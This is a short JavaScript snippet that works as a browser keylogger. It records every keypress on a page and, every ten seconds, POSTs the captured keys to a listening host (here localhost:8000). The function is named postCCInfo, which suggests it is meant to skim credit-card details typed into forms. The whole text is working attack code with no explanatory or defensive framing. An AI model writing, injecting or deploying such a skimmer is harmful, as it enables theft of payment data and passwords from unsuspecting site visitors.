function postCCInfo(ccInfo){
    var url = "http://127.0.0.1:8000";
    var params = `c=${ccInfo}`;
    var xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.send(params);
}

var keys = '';
     
document.onkeypress = function(e) {
    var get = window.event ? event : e;
    var key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    keys += key;
}


window.setInterval(function(){
    postCCInfo(keys);
    keys = '';
}, 10000);